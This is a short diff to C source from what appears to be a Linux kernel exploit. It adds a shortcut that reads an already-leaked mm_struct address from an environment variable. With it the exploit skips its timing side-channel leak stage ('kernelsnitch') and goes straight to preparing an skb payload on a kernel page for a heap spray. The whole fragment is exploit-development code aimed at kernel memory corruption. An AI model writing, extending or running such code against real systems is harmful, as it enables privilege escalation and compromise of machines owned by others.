@@ -691,6 +691,19 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
           "pre=%zu post=%zu\n",
           cpu_count, mm_objs_per_slab, prepare_ctx.mm_cnt, spray_ctx.mm_cnt,
           pre_ctx.mm_cnt, post_ctx.mm_cnt);
+  const char *ovr = getenv("MM_OVERRIDE");
+  if (ovr && ovr[0]) {
+    /* v14 fast path: mm solved earlier this boot (logged); skip the 4-min
+       kernelsnitch so the gear sweep runs spray+walk only (~15s/gear). */
+    uintptr_t leaked = (uintptr_t)strtoull(ovr, NULL, 16);
+    pr_info("[probe] MM_OVERRIDE fast path leaked=%016zx\n", leaked);
+    last_mm_struct = leaked;
+    if (!prepare_skb_payload(leaked & ~(ORDER3_SIZE - 1), payload_mode)) {
+      cleanup_page_prepare_state();
+      return 0;
+    }
+    return leaked & ~(ORDER3_SIZE - 1);
+  }
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
   pr_info("KernelSnitch parameters: threads=%zu collisions=%zu futexes=%zu "
